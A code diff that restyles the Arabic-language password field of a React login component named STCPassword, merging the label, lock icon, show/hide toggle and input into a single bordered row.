@@ -97,11 +97,10 @@ export default function STCPassword() {
         <form onSubmit={handleSubmit(onSubmit)} className="flex-1 flex flex-col">
           {/* Password Field */}
           <div className="space-y-2">
-            <div className="flex items-center justify-between">
-              <div className="flex items-center gap-2">
-                <Lock className="w-4 h-4 text-gray-400" />
-                <span className="text-gray-700 text-sm">كلمة المرور</span>
-              </div>
+            <div 
+              className="flex items-center justify-between border border-gray-300 rounded-lg px-4 py-3"
+              style={{ backgroundColor: '#FAFAFA' }}
+            >
               <button
                 type="button"
                 onClick={() => setShowPassword(!showPassword)}
@@ -110,16 +109,19 @@ export default function STCPassword() {
               >
                 {showPassword ? "إخفاء" : "اظهار"}
               </button>
-            </div>
-            <div className="relative">
-              <Input
+              
+              <input
                 id="password"
                 type={showPassword ? "text" : "password"}
-                placeholder=""
-                className="text-left pl-4 h-12 border-gray-300"
+                className="flex-1 bg-transparent text-left outline-none mx-4"
                 dir="ltr"
                 {...register("password")}
               />
+              
+              <div className="flex items-center gap-2">
+                <span className="text-gray-500 text-sm">كلمة المرور</span>
+                <Lock className="w-4 h-4 text-gray-400" />
+              </div>
             </div>
             {errors.password && (
               <p className="text-red-500 text-xs text-right">{errors.password.message}</p>
